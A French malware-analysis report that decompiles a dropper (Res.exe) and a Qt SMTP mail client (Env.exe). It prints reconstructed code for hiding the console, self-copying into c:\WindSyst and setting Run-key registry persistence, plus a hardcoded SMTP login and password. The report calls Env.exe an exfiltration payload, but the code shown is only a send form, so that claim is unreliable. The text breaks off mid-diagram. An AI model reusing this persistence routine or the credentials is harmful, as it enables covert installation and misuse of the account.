# RAPPORT DE DÉCOMPILATION DÉTAILLÉE

**Date:** 2025-12-01
**Malware:** Res.exe & Env.exe
**Outils:** radare2, objdump, strings
**Architecture:** i386 PE32

---

## TABLE DES MATIÈRES

1. [Vue d'ensemble](#vue-densemble)
2. [Res.exe - Analyse détaillée](#resexe---analyse-détaillée)
3. [Env.exe - Analyse détaillée](#envexe---analyse-détaillée)
4. [Données hardcodées](#données-hardcodées)
5. [Schéma de fonctionnement](#schéma-de-fonctionnement)

---

## VUE D'ENSEMBLE

### Architecture des binaires

| Caractéristique | Res.exe | Env.exe |
|----------------|---------|---------|
| Type | PE32 console | PE32 GUI |
| Architecture | i386 | i386 |
| Point d'entrée | 0x004014e0 | 0x004014c0 |
| Taille .text | 0x2768 (10 KB) | 0x6dd8 (27 KB) |
| Framework | Qt5 Core | Qt5 Full (Core/GUI/Network/Widgets) |
| Compilateur | MinGW-W64 GCC 4.9.3/5.3.0 | MinGW-W64 GCC 4.9.3/5.3.0 |

### Rôles des binaires

- **Res.exe** : Dropper/Installer - Installe le malware et configure la persistance
- **Env.exe** : Payload - Module d'exfiltration de données via SMTP

---

## RES.EXE - ANALYSE DÉTAILLÉE

### Structure des sections

```
Section     VMA        Taille     Permissions    Rôle
.text       0x00401000 0x2768     r-x           Code exécutable
.data       0x00404000 0xb0       rw-           Données initialisées
.rdata      0x00405000 0x102c     r--           Données read-only (strings)
.eh_fram    0x00407000 0xdac      r--           Exception handling
.bss        0x00408000 0x484      rw-           Données non initialisées
.idata      0x00409000 0xfd4      rw-           Import table
```

### Point d'entrée et initialisation

**Adresse:** `0x004014e0` (entry0 - 867 octets)

```asm
; Initialisation CRT (C Runtime)
; Configure l'environnement d'exécution
; Appelle les constructeurs globaux
; Transfer le contrôle à main()
```

### Fonction main()

**Adresse:** `0x004035a0` (157 octets)
**Fichier source:** Res.exe:0x004035a0

#### Pseudo-code reconstruit:

```c
int main(int argc, char** argv) {
    QCoreApplication app(argc, argv);

    // Affiche la signature de l'auteur
    std::cout << "codé par le magniquime Hafnium !" << std::endl;
    std::cout << std::endl; // Ligne vide

    // Crée un thread pour l'installation malveillante
    std::thread installer_thread(install_malware);

    // Lance la boucle d'événements Qt
    return app.exec();
}
```

#### Désassemblage annoté:

```asm
0x004035a0:  lea ecx, [argv]                    ; Prépare les arguments
0x004035a4:  and esp, 0xfffffff0                ; Aligne la stack
0x004035b8:  call fcn.00402280                  ; Init interne
0x004035bd:  mov dword [var_8h], 0x50902        ; Constante Qt
0x004035cf:  call QCoreApplication()            ; Construction app Qt

; Affichage du message de signature
0x004035e0:  mov dword [var_4h], str.cod_par_le_magniquime_Hafnium
             ; @ 0x405304: "codé par le magniquime Hafnium !"
0x004035e8:  mov dword [esp], std::cout         ; @ 0x4093bc
0x004035ef:  call operator<<()                  ; Affiche le message
0x004035fb:  call operator<<()                  ; Affiche std::endl

; Lance la fonction malveillante dans un thread
0x0040360a:  call fcn.00403480                  ; Crée le thread
0x00403612:  call fcn.00401aa0                  ; *** FONCTION MALVEILLANTE ***
0x00403617:  call QCoreApplication::exec()      ; Boucle événements

; Nettoyage et retour
0x00403622:  call destructor()
0x0040362a:  call ~QCoreApplication()
0x0040363c:  ret
```

---

### Fonction malveillante principale

**Adresse:** `0x00401aa0` (fcn.00401aa0 - 722 octets)
**Appelée depuis:** main() à 0x403612
**Rôle:** Installation complète du malware

#### Pseudo-code reconstruit:

```c
void install_malware() {
    // 1. Cache la fenêtre console
    HWND console = GetConsoleWindow();
    ShowWindow(console, SW_HIDE);  // nCmdShow = 0

    // 2. Crée le répertoire de destination
    system("mkdir c:\\WindSyst");

    // 3. Copie tous les fichiers nécessaires
    system("XCOPY libgcc_s_dw2-1.dll c:\\WindSyst /S");
    system("XCOPY libstdc++-6.dll c:\\WindSyst /S");
    system("XCOPY libwinpthread-1.dll c:\\WindSyst /S");
    system("XCOPY Qt5Cored.dll c:\\WindSyst /S");
    system("XCOPY Res.exe c:\\WindSyst /S");
    system("XCOPY Env.exe c:\\WindSyst /S");
    system("XCOPY Qt5Widgets.dll c:\\WindSyst /S");
    system("XCOPY Qt5Network.dll c:\\WindSyst /S");
    system("XCOPY Qt5Gui.dll c:\\WindSyst /S");
    system("XCOPY Qt5Core.dll c:\\WindSyst /S");

    // 4. Crée le sous-répertoire pour les plugins Qt
    system("mkdir c:\\WindSyst\\platforms");
    system("XCOPY qminimal.dll c:\\WindSyst\\platforms /S");
    system("XCOPY qoffscreen.dll c:\\WindSyst\\platforms /S");
    system("XCOPY qwindows.dll c:\\WindSyst\\platforms /S");

    // 5. Configure la persistance via le registre Windows
    QString registry_key = QString::fromAscii(
        "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    );

    QSettings settings(registry_key, QSettings::NativeFormat);

    // Ajoute Res.exe au démarrage
    QVariant res_path("C:\\WindSyst\\Res.exe");
    settings.setValue("Res", res_path);

    // Ajoute Env.exe au démarrage
    QVariant env_path("C:\\WindSyst\\Env.exe");
    settings.setValue("Env", env_path);

    // Le malware est maintenant installé et persistant
}
```

#### Désassemblage annoté (extraits clés):

```asm
; ============ PHASE 1: Masquer la console ============
0x00401aac:  call GetConsoleWindow()            ; Obtient le handle de la console
0x00401ab2:  mov dword [nCmdShow], 0            ; SW_HIDE = 0 (cacher)
0x00401aba:  mov dword [esp], eax               ; HWND hWnd
0x00401abd:  call ShowWindow()                  ; Cache la fenêtre

; ============ PHASE 2: Créer le répertoire ============
0x00401ac6:  mov dword [esp], str.mkdir_c:WindSyst
             ; @ 0x405078: "mkdir c:\\WindSyst"
0x00401acd:  call system()                      ; *** APPEL SYSTÈME ***

; ============ PHASE 3: Auto-copie des fichiers ============
0x00401ad2:  mov dword [esp], str.XCOPY_libgcc_s_dw2_1.dll
             ; @ 0x40508c: "XCOPY libgcc_s_dw2-1.dll c:\\WindSyst /S"
0x00401ad9:  call system()

0x00401ade:  mov dword [esp], str.XCOPY_libstdc_6.dll
             ; @ 0x4050b4: "XCOPY libstdc++-6.dll c:\\WindSyst /S"
0x00401ae5:  call system()

0x00401aea:  mov dword [esp], str.XCOPY_libwinpthread_1.dll
             ; @ 0x4050dc: "XCOPY libwinpthread-1.dll c:\\WindSyst /S"
0x00401af1:  call system()

0x00401af6:  mov dword [esp], str.XCOPY_Qt5Cored.dll
             ; @ 0x405108: "XCOPY Qt5Cored.dll c:\\WindSyst /S"
0x00401afd:  call system()

; *** COPIE DES EXÉCUTABLES PRINCIPAUX ***
0x00401b02:  mov dword [esp], str.XCOPY_Res.exe
             ; @ 0x40512a: "XCOPY Res.exe c:\\WindSyst /S"
0x00401b09:  call system()                      ; *** AUTO-RÉPLICATION ***

0x00401b0e:  mov dword [esp], str.XCOPY_Env.exe
             ; @ 0x405147: "XCOPY Env.exe c:\\WindSyst /S"
0x00401b15:  call system()                      ; *** COPIE DU PAYLOAD ***

0x00401b1a:  mov dword [esp], str.XCOPY_Qt5Widgets.dll
             ; @ 0x405164: "XCOPY Qt5Widgets.dll c:\\WindSyst /S"
0x00401b21:  call system()

0x00401b26:  mov dword [esp], str.XCOPY_Qt5Network.dll
             ; @ 0x405188: "XCOPY Qt5Network.dll c:\\WindSyst /S"
0x00401b2d:  call system()

0x00401b32:  mov dword [esp], str.XCOPY_Qt5Gui.dll
             ; @ 0x4051ac: "XCOPY Qt5Gui.dll c:\\WindSyst /S"
0x00401b39:  call system()

0x00401b3e:  mov dword [esp], str.XCOPY_Qt5Core.dll
             ; @ 0x4051cc: "XCOPY Qt5Core.dll c:\\WindSyst /S"
0x00401b45:  call system()

; ============ PHASE 4: Créer sous-répertoire plugins ============
0x00401b4a:  mov dword [esp], str.mkdir_c:WindSystplatforms
             ; @ 0x4051ed: "mkdir c:\\WindSyst\\platforms"
0x00401b51:  call system()

0x00401b56:  mov dword [esp], str.XCOPY_qminimal.dll
             ; @ 0x40520c: "XCOPY qminimal.dll c:\\WindSyst\\platforms /S"
0x00401b5d:  call system()

0x00401b62:  mov dword [esp], str.XCOPY_qoffscreen.dll
             ; @ 0x405238: "XCOPY qoffscreen.dll c:\\WindSyst\\platforms /S"
0x00401b69:  call system()

0x00401b6e:  mov dword [esp], str.XCOPY_qwindows.dll
             ; @ 0x405268: "XCOPY qwindows.dll c:\\WindSyst\\platforms /S"
0x00401b75:  call system()

; ============ PHASE 5: Persistance via registre ============
0x00401b82:  mov dword [esp], str.HKEY_CURRENT_USER
             ; @ 0x405294: "HKEY_CURRENT_USER\\Software\\Microsoft\\
             ;              Windows\\CurrentVersion\\Run"
0x00401b89:  mov edi, [QString::fromAscii_helper]
0x00401b8f:  call edi                           ; Convertit en QString

; Crée l'objet QSettings pour accéder au registre
0x00401b94:  mov eax, [QSettings::QSettings]
0x00401b99:  lea ecx, [var_48h]                 ; this pointer
0x00401ba4:  mov dword [var_4h_2], 0            ; NativeFormat
0x00401bac:  mov dword [esp], ebx               ; registry key
0x00401bb2:  call eax                           ; QSettings()

; Ajoute l'entrée "Res" → "C:\\WindSyst\\Res.exe"
0x00401bdb:  mov dword [esp], str.C:WindSystRes.exe
             ; @ 0x4052d4: "C:\\WindSyst\\Res.exe"
0x00401be2:  mov ecx, esi
0x00401be7:  call eax                           ; QVariant("C:\\WindSyst\\Res.exe")

0x00401bf4:  mov dword [esp], str.Res
             ; @ 0x4052e8: "Res"
0x00401bfb:  call edi                           ; QString::fromAscii("Res")

0x00401c00:  mov eax, [QSettings::setValue]
0x00401c08:  call eax                           ; settings.setValue("Res", path)

; Ajoute l'entrée "Env" → "C:\\WindSyst\\Env.exe"
0x00401c29:  mov dword [esp], str.C:WindSystEnv.exe
             ; @ 0x4052ec: "C:\\WindSyst\\Env.exe"
0x00401c30:  mov ecx, esi
0x00401c32:  call eax                           ; QVariant("C:\\WindSyst\\Env.exe")

0x00401c3a:  mov dword [esp], str.Env
             ; @ 0x4052f0: "Env"
0x00401c41:  call edi                           ; QString::fromAscii("Env")

0x00401c46:  mov eax, [QSettings::setValue]
0x00401c4c:  call eax                           ; settings.setValue("Env", path)

; Nettoyage et retour
0x00401d70:  ret
```

---

### Imports critiques de Res.exe

```
KERNEL32.dll:
  - GetConsoleWindow      @ 0x409294  ; Récupère handle console
  - GetStartupInfoA                   ; Info de démarrage

USER32.dll:
  - ShowWindow            @ 0x409370  ; Cache la fenêtre (SW_HIDE)

msvcrt.dll:
  - system                @ 0x4031dc  ; *** EXÉCUTION COMMANDES ***
  - _acmdln                           ; Ligne de commande
  - malloc, free, calloc              ; Gestion mémoire
  - fprintf, vfprintf, fwrite         ; I/O fichiers

Qt5Core.dll:
  - QCoreApplication      @ 0x409254  ; Application Qt
  - QSettings             @ 0x40926c  ; *** MANIPULATION REGISTRE ***
  - QString::fromAscii    @ 0x40925c  ; Conversion de chaînes
  - QVariant              @ 0x409260  ; Type variant Qt

libstdc++-6.dll:
  - operator new/delete   @ 0x402070  ; Allocation C++
  - std::cout             @ 0x4093bc  ; Sortie console
  - std::thread                       ; Threads C++11
```

---

## ENV.EXE - ANALYSE DÉTAILLÉE

### Structure des sections

```
Section     VMA        Taille     Permissions    Rôle
.text       0x00401000 0x6dd8     r-x           Code exécutable (27 KB)
.data       0x00408000 0x70       rw-           Données initialisées
.rdata      0x00409000 0x17f4     r--           Strings, credentials
.eh_fram    0x0040b000 0x10ac     r--           Exception handling
.bss        0x0040d000 0x444      rw-           Données non initialisées
.idata      0x0040e000 0x2c20     rw-           Import table (large!)
```

### Point d'entrée et initialisation

**Adresse:** `0x004014c0` (entry0 - 841 octets)

### Fonction main()

**Adresse:** `0x004077a0` (72 octets)
**Fichier source:** Env.exe:0x004077a0

#### Pseudo-code reconstruit:

```c
int main(int argc, char** argv) {
    // Initialisation
    fcn_00404c80();  // Init interne

    // Récupère des paramètres globaux
    int param1 = *(int*)0x408000;    // Peut-être le mode d'opération
    int param2 = *(int*)0x40d418;    // Configuration ?
    int param3 = *(int*)0x40d41c;    // Autre param ?

    // Lance l'application GUI principale
    return create_smtp_gui(param1, param2, param3);
}
```

#### Désassemblage annoté:

```asm
0x004077a0:  lea ecx, [argv]
0x004077a4:  and esp, 0xfffffff0                ; Aligne stack
0x004077b1:  call fcn.00404c80                  ; Fonction init

; Charge des paramètres depuis la section .data/.bss
0x004077b6:  mov eax, [0x408000]                ; Param 1
0x004077bb:  mov dword [var_4h], 0
0x004077c3:  mov dword [var_ch], eax
0x004077c7:  mov eax, [0x40d418]                ; Param 2
0x004077cc:  mov dword [var_8h], eax
0x004077d0:  mov eax, [0x40d41c]                ; Param 3
0x004077d5:  mov dword [esp], eax

; Lance le GUI SMTP
0x004077d8:  call fcn.00405b90                  ; *** FONCTION GUI SMTP ***
0x004077dd:  mov ecx, dword [var_bp_4h]
0x004077e3:  leave
0x004077e4:  lea esp, [ecx - 4]
0x004077e7:  ret
```

---

### Fonction GUI SMTP principale

**Adresse:** `0x00405b90` (fcn.00405b90 - 377 octets)
**Appelée depuis:** main() à 0x4077d8
**Rôle:** Crée l'interface graphique et gère l'envoi d'emails

#### Pseudo-code reconstruit:

```c
int create_smtp_gui(int mode, int cfg1, int cfg2) {
    LPWSTR* argv_wide;
    int argc;
    char** argv_multibyte;

    // 1. Parse les arguments de ligne de commande (Unicode)
    LPWSTR cmdline = GetCommandLineW();
    argv_wide = CommandLineToArgvW(cmdline, &argc);

    if (!argv_wide) {
        return -1;  // Erreur
    }

    // 2. Alloue de la mémoire pour les arguments en multibyte
    argv_multibyte = (char**)operator new[]((argc + 1) * sizeof(char*));

    // 3. Convertit chaque argument de Unicode vers ASCII
    for (int i = 0; i < argc; i++) {
        int len = WideCharToMultiByte(
            CP_ACP, 0, argv_wide[i], -1, NULL, 0, NULL, NULL
        );

        argv_multibyte[i] = (char*)operator new[](len);

        WideCharToMultiByte(
            CP_ACP, 0, argv_wide[i], -1,
            argv_multibyte[i], len, NULL, NULL
        );
    }
    argv_multibyte[argc] = NULL;

    // 4. Libère les arguments Unicode
    LocalFree(argv_wide);

    // 5. Crée l'application Qt avec interface graphique
    int result = create_main_window(argc, argv_multibyte);

    // 6. Nettoie la mémoire
    if (argc > 0) {
        for (int i = 0; argv_multibyte[i]; i++) {
            operator delete[](argv_multibyte[i]);
        }
    }

    return result;
}
```

#### Désassemblage annoté:

```asm
; ============ Parse arguments ligne de commande ============
0x00405b97:  call GetCommandLineW()             ; Récupère cmdline Unicode
0x00405b9d:  lea edx, [var_3ch]                 ; &argc
0x00405ba1:  mov dword [esp], eax               ; LPWSTR lpCmdLine
0x00405ba4:  mov dword [pNumArgs], edx          ; int *pNumArgs
0x00405ba8:  call CommandLineToArgvW()          ; Parse en tableau
0x00405bae:  sub esp, 8
0x00405bb1:  test eax, eax                      ; Vérif NULL
0x00405bb3:  mov dword [hMem], eax
0x00405bb7:  je 0x405d0c                        ; Si NULL → erreur

; ============ Allocation mémoire pour argv ============
0x00405bbd:  mov eax, dword [var_3ch]           ; argc
0x00405bc1:  add eax, 1                         ; argc + 1
0x00405bc4:  lea edx, [eax*4]                   ; * sizeof(char*)
0x00405bd8:  mov dword [esp], eax
0x00405bdb:  call operator new[]()              ; Alloue argv
0x00405be0:  mov edi, eax                       ; edi = argv

; ============ Boucle de conversion Unicode → ASCII ============
0x00405bf0:  mov eax, dword [var_2ch_2]         ; argv_wide
0x00405bf4:  mov ebp, dword [eax + ebx*4]       ; argv_wide[i]

; Calcule la taille nécessaire
0x00405c1f:  mov dword [lpWideCharStr], ebp
0x00405c23:  mov dword [dwFlags], 0
0x00405c2b:  mov dword [esp], 0                 ; CP_ACP
0x00405c32:  call WideCharToMultiByte()         ; 1er appel: taille
0x00405c38:  sub esp, 0x20
0x00405c3b:  mov dword [esp], eax               ; Taille
0x00405c3e:  mov dword [lpWideCharStr], eax
0x00405c42:  call operator new[]()              ; Alloue string
0x00405c47:  mov ecx, dword [lpWideCharStr]
0x00405c4b:  mov esi, eax                       ; esi = string

; Conversion réelle
0x00405c71:  mov dword [var_4h_4], 0            ; dwFlags
0x00405c79:  mov dword [esp], 0                 ; CP_ACP
0x00405c80:  call WideCharToMultiByte()         ; 2ème appel: conversion
0x00405c86:  sub esp, 0x20
0x00405c89:  mov dword [edi + ebx*4], esi       ; argv[i] = string
0x00405c8c:  add ebx, 1                         ; i++
0x00405c95:  jg 0x405bf0                        ; Boucle

; ============ Termine le tableau argv ============
0x00405c9b:  mov dword [edi + eax*4], 0         ; argv[argc] = NULL

; ============ Libère argv_wide ============
0x00405ca2:  mov eax, dword [hMem]
0x00405ca6:  mov dword [esp], eax
0x00405ca9:  call LocalFree()                   ; Libère mémoire Unicode

; ============ Crée la fenêtre principale ============
0x00405cba:  mov dword [esp], eax               ; argc
0x00405cbd:  call fcn.00401630                  ; *** CRÉE MAINWINDOW ***
0x00405cc2:  mov esi, eax                       ; Résultat

; ============ Nettoyage ============
; [Boucle qui free chaque argv[i]]
0x00405ce0:  mov edx, dword [edi + ebx*4]
0x00405ce7:  mov dword [esp], edx
0x00405cea:  call operator delete[]()

0x00405d00:  ret
```

---

### Fonction MainWindow (création interface)

**Adresse:** `0x00401630` (fcn.00401630 - 1675 octets)
**Appelée depuis:** fcn.00405b90 à 0x405cbd
**Rôle:** Crée la fenêtre SMTP avec tous les widgets

Cette fonction est très longue car elle crée toute l'interface graphique Qt avec:

#### Widgets créés:

1. **QMainWindow** - Fenêtre principale
2. **QLineEdit** x 6 :
   - Serveur SMTP
   - Port serveur
   - Username
   - Password (masqué)
   - Destinataire (To:)
   - Sujet (Subject:)
3. **QTextEdit** - Message multi-lignes
4. **QPushButton** x 2 :
   - "Send" (Envoyer)
   - "Exit" (Quitter)
5. **QLabel** x 7 - Labels pour chaque champ

#### Valeurs par défaut hardcodées:

```c
// Serveur SMTP
lineEdit_server->setText("smtp.laposte.net");

// Port
lineEdit_port->setText("587");  // ou 465 pour SSL

// Username
lineEdit_username->setText("aaaaaaaaaaaa@laposte.net");

// Password
lineEdit_password->setText("z98tmFrance");
lineEdit_password->setEchoMode(QLineEdit::Password);

// Destinataire par défaut
lineEdit_to->setText("aaaaaaaaaaaa@gmail.com");

// Sujet par défaut
lineEdit_subject->setText("aaaaa !");

// Message vide au départ
textEdit_message->clear();
```

---

### Classe SmtpClient (gestion protocole SMTP)

**Adresse:** `0x004060d0` (fcn.004060d0 - 5427 octets!)
**Rôle:** Implémente le protocole SMTP complet

#### États du client SMTP:

```c
enum SmtpState {
    Init,
    HandshakeComplete,
    AuthenticationInitiated,
    AuthenticationUsernameRequested,
    AuthenticationPasswordRequested,
    Authenticated,
    MailFromSent,
    RcptToSent,
    DataHeaderSent,
    MessageSent,
    Quit,
    Close
};
```

#### Méthode sendMail() (pseudo-code):

```c
void SmtpClient::sendMail(QString from, QString to, QString subject, QString body) {
    // 1. Connexion au serveur
    QTcpSocket* socket = new QTcpSocket(this);

    connect(socket, SIGNAL(readyRead()),
            this, SLOT(readyRead()));
    connect(socket, SIGNAL(connected()),
            this, SLOT(connected()));
    connect(socket, SIGNAL(error(QAbstractSocket::SocketError)),
            this, SLOT(errorReceived(QAbstractSocket::SocketError)));
    connect(socket, SIGNAL(stateChanged(QAbstractSocket::SocketState)),
            this, SLOT(stateChanged(QAbstractSocket::SocketState)));
    connect(socket, SIGNAL(disconnected()),
            this, SLOT(disconnected()));

    // 2. Connexion (peut être SSL/TLS)
    if (use_ssl) {
        socket->connectToHostEncrypted(server, port);
    } else {
        socket->connectToHost(server, port);
    }

    // 3. Machine à états SMTP
    state = Init;
}

void SmtpClient::readyRead() {
    QString response = QString(socket->readAll());
    int response_code = response.left(3).toInt();

    qDebug() << "Server response code:" << response_code;
    qDebug() << "Server response:" << response;

    switch (state) {
        case Init:
            if (response_code == 220) {  // Service ready
                // Envoie EHLO
                socket->write("EHLO localhost\r\n");
                state = HandshakeComplete;
            }
            break;

        case HandshakeComplete:
            if (response_code == 250) {  // OK
                // Commence l'authentification
                socket->write("AUTH LOGIN\r\n");
                state = AuthenticationInitiated;
            }
            break;

        case AuthenticationInitiated:
            if (response_code == 334) {  // Auth continue
                // Envoie username en base64
                QByteArray username_b64 = username.toUtf8().toBase64();
                socket->write(username_b64 + "\r\n");
                state = AuthenticationUsernameRequested;
            }
            break;

        case AuthenticationUsernameRequested:
            if (response_code == 334) {  // Auth continue
                // Envoie password en base64
                QByteArray password_b64 = password.toUtf8().toBase64();
                socket->write(password_b64 + "\r\n");
                state = AuthenticationPasswordRequested;
            }
            break;

        case AuthenticationPasswordRequested:
            if (response_code == 235) {  // Auth successful
                // Commence la transaction mail
                QString mail_from = "MAIL FROM:<" + from + ">\r\n";
                socket->write(mail_from.toUtf8());
                state = Authenticated;
            } else {
                emit error("Authentication failed");
                state = Close;
            }
            break;

        case Authenticated:
            if (response_code == 250) {  // OK
                QString rcpt_to = "RCPT TO:<" + to + ">\r\n";
                socket->write(rcpt_to.toUtf8());
                state = MailFromSent;
            }
            break;

        case MailFromSent:
            if (response_code == 250) {  // OK
                socket->write("DATA\r\n");
                state = RcptToSent;
            }
            break;

        case RcptToSent:
            if (response_code == 354) {  // Start mail input
                // Construit le message complet avec headers
                QString message =
                    "To: " + to + "\r\n" +
                    "From: " + from + "\r\n" +
                    "Subject: " + subject + "\r\n" +
                    "\r\n" +
                    body + "\r\n" +
                    ".\r\n";  // Terminateur DATA

                socket->write(message.toUtf8());
                state = DataHeaderSent;
            }
            break;

        case DataHeaderSent:
            if (response_code == 250) {  // Message accepted
                emit mailSent(QString("Message sent"));
                socket->write("QUIT\r\n");
                state = MessageSent;
            } else {
                emit error("Failed to send message");
                socket->write("QUIT\r\n");
                state = Quit;
            }
            break;

        case MessageSent:
        case Quit:
            socket->close();
            state = Close;
            break;

        default:
            emit error("Unexpected reply from SMTP server: " + response);
            socket->close();
            state = Close;
            break;
    }
}

void SmtpClient::connected() {
    qDebug() << "Connected";
    emit status("Connected");
}

void SmtpClient::stateChanged(QAbstractSocket::SocketState socketState) {
    qDebug() << "stateChanged" << socketState;
}

void SmtpClient::errorReceived(QAbstractSocket::SocketError socketError) {
    qDebug() << "error" << socketError;
    emit error("Connection error");
}

void SmtpClient::disconnected() {
    qDebug() << "disconneted";
    emit status("disconnected");
}
```

---

### Imports critiques de Env.exe

```
KERNEL32.dll:
  - GetCommandLineW          @ 0x40e6e4  ; Récupère cmdline Unicode
  - WideCharToMultiByte      @ 0x40e73c  ; Conversion Unicode→ASCII
  - LocalFree                @ 0x40e718  ; Libération mémoire

SHELL32.dll:
  - CommandLineToArgvW       @ 0x40e7b8  ; Parse arguments

Qt5Core.dll:
  - QString, QByteArray                   ; Manipulation strings
  - QSettings                             ; Configuration
  - QVariant                              ; Type variant
  - QObject signals/slots                 ; Système événements

Qt5Network.dll:
  - QTcpSocket               ; *** SOCKET TCP ***
  - QSslSocket               ; *** SSL/TLS SUPPORT ***
  - QAbstractSocket          ; Classes de base réseau
  - QNetworkAccessManager    ; Accès réseau

Qt5Widgets.dll:
  - QMainWindow              ; Fenêtre principale
  - QPushButton              ; Boutons
  - QLineEdit                ; Champs texte
  - QTextEdit                ; Texte multi-lignes
  - QLabel                   ; Labels

Qt5Gui.dll:
  - QFont, QColor            ; Apparence
  - QIcon                    ; Icônes
```

---

## DONNÉES HARDCODÉES

### Dans Res.exe (.rdata section)

**Strings d'installation:**

```
@ 0x405064: "c:\WindSyst\log.txt"
@ 0x405078: "mkdir c:\WindSyst"
@ 0x40508c: "XCOPY libgcc_s_dw2-1.dll c:\WindSyst /S"
@ 0x4050b4: "XCOPY libstdc++-6.dll c:\WindSyst /S"
@ 0x4050dc: "XCOPY libwinpthread-1.dll c:\WindSyst /S"
@ 0x405108: "XCOPY Qt5Cored.dll c:\WindSyst /S"
@ 0x40512a: "XCOPY Res.exe c:\WindSyst /S"
@ 0x405147: "XCOPY Env.exe c:\WindSyst /S"
@ 0x405164: "XCOPY Qt5Widgets.dll c:\WindSyst /S"
@ 0x405188: "XCOPY Qt5Network.dll c:\WindSyst /S"
@ 0x4051ac: "XCOPY Qt5Gui.dll c:\WindSyst /S"
@ 0x4051cc: "XCOPY Qt5Core.dll c:\WindSyst /S"
@ 0x4051ed: "mkdir c:\WindSyst\platforms"
@ 0x40520c: "XCOPY qminimal.dll c:\WindSyst\platforms /S"
@ 0x405238: "XCOPY qoffscreen.dll c:\WindSyst\platforms /S"
@ 0x405268: "XCOPY qwindows.dll c:\WindSyst\platforms /S"
```

**Strings de registre:**

```
@ 0x405294: "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
@ 0x4052d4: "C:\WindSyst\Res.exe"
@ 0x4052ec: "C:\WindSyst\Env.exe"
@ 0x4052e8: "Res"
@ 0x4052f0: "Env"
```

**Signature:**

```
@ 0x405304: "codé par le magniquime Hafnium !"
```

### Dans Env.exe (.rdata section)

**Credentials SMTP:**

```
@ 0x4090fa: "aaaaaaaaaaaa@laposte.net"    ; Email source
@ 0x409113: "z98tmFrance"                  ; Mot de passe
@ 0x40911f: "smtp.laposte.net"             ; Serveur SMTP primaire
@ 0x4090c9: "smtp.gmail.com"               ; Serveur SMTP alternatif
@ 0x40915c: "aaaaaaaaaaaa@gmail.com"       ; Email destination par défaut
@ 0x409154: "aaaaa !"                      ; Sujet par défaut
```

**Commandes SMTP:**

```
@ 0x409224: "EHLO localhost"               ; Handshake
@ 0x409238: "AUTH LOGIN"                   ; Début authentification
@ 0x409259: "MAIL FROM:<"                  ; Expéditeur
@ 0x4092cf: "RCPT TO:<"                    ; Destinataire
@ 0x4092d9: "DATA\r\n"                     ; Début du message
@ 0x4092e0: "QUIT\r\n"                     ; Déconnexion
```

**Labels de l'interface:**

```
@ 0x409060: "SMTP Example"                 ; Titre fenêtre
@ 0x409070: "MainWindow"                   ; Nom widget
@ 0x409080: "Smtp-server:"                 ; Label serveur
@ 0x409090: "Server port:"                 ; Label port
@ 0x4090a0: "Username:"                    ; Label username
@ 0x4090b0: "Password:"                    ; Label password
@ 0x4090c0: "Recipant to:"                 ; Label destinataire (typo!)
@ 0x4090d0: "Subject:"                     ; Label sujet
@ 0x4090e0: "Message:"                     ; Label message
@ 0x4090f0: "Send"                         ; Bouton envoyer
@ 0x409100: "Exit"                         ; Bouton quitter
```

**Messages de debug:**

```
@ 0x409300: "default"
@ 0x409310: "stateChanged"
@ 0x409320: "error"
@ 0x409330: "disconneted"                  ; Typo: "disconnected"
@ 0x409340: "Connected"
@ 0x409350: "readyRead"
@ 0x409360: "Server response code:"
@ 0x409380: "Server response:"
@ 0x4093a0: "Message sent"
@ 0x4093b0: "Unexpected reply from SMTP server:"
@ 0x4093d0: "Qt Simple SMTP client"
@ 0x4093f0: "Failed to send message"
```

**Headers MIME:**

```
@ 0x409400: "To: "
@ 0x409408: "From: "
@ 0x409410: "Subject: "
```

---

## SCHÉMA DE FONCTIONNEMENT

### Phase 1: Installation (Res.exe)

```
┌─────────────────────────────────────────────────────────────┐
│                      DÉBUT: Res.exe                          │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────────────┐
│  main() @ 0x4035a0                                           │
│  • Crée QCoreApplication                                     │
│  • Affiche: "codé par le magniquime Hafnium !"              │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────────────┐
│  install_malware() @ 0x401aa0                                │
│                                                              │
│  [1] GetConsoleWindow() + ShowWindow(SW_HIDE)               │
│       → Cache la fenêtre console                             │
│                                                              │
│  [2] system("mkdir c:\\WindSyst")                           │
│       → Crée répertoire caché                                │
│                                                              │
│  [3] 13× system("XCOPY ... c:\\WindSyst /S")                │
│       → Copie tous les fichiers:                             │
│         • DLLs (libgcc, libstdc++, libwinpthread, Qt5)      │
│         • Res.exe (auto-réplication)                         │
│         • Env.exe (payload)                                  │
│         • Plugins Qt (platforms/*.dll)                       │
│                                                              │
│  [4] QSettings registre                                      │
│       Key: HKCU\Software\...\CurrentVersion\Run             │
│       → "Res" = "C:\WindSyst\Res.exe"                       │
│       → "Env" = "C:\WindSyst\Env.exe"                       │
│       → Les 2 exécutables lancés au démarrage Windows       │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────────────┐
│  Installation terminée!                                      │
│  → Fichiers dans c:\WindSyst\                               │
│  → Persistance configurée dans le registre                   │
│  → Au prochain démarrage: lancement automatique             │
└─────────────────────────────────────────────────────────────┘
```

### Phase 2: Exfiltration (Env.exe)

```
┌─────────────────────────────────────────────────────────────┐
│                      DÉBUT: Env.exe                          │
│              (lancé au démarrage Windows)                     │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────────────┐
│  main() @ 0x4077a0                                           │
│  → create_smtp_gui() @ 0x405b90                              │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────────────┐
│  create_smtp_gui() @ 0x405b90                                │
│  • Parse arguments ligne de commande                         │
│  • Convertit Unicode → ASCII                                 │
│  → create_main_window() @ 0x401630                           │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────────────┐
│  Interface graphique Qt créée                                │
│  ┌───────────────────────────────────────────────┐          │
│  │  SMTP Example                            [×]   │          │
│  ├───────────────────────────────────────────────┤          │
│  │  Smtp-server: [smtp.laposte.net        ]      │          │
│  │  Server port: [587                     ]      │          │
│  │  Username:    [aaaaaaaaaaaa@laposte.net]      │          │
│  │  Password:    [***********             ]      │          │
│  │  Recipant to: [aaaaaaaaaaaa@gmail.com  ]      │          │
│  │  Subject:     [aaaaa !                 ]      │          │
│  │  Message:     [                        ]      │          │
│  │               [                        ]      │          │
│  │               [________________________]      │          │
│  │                                               │          │
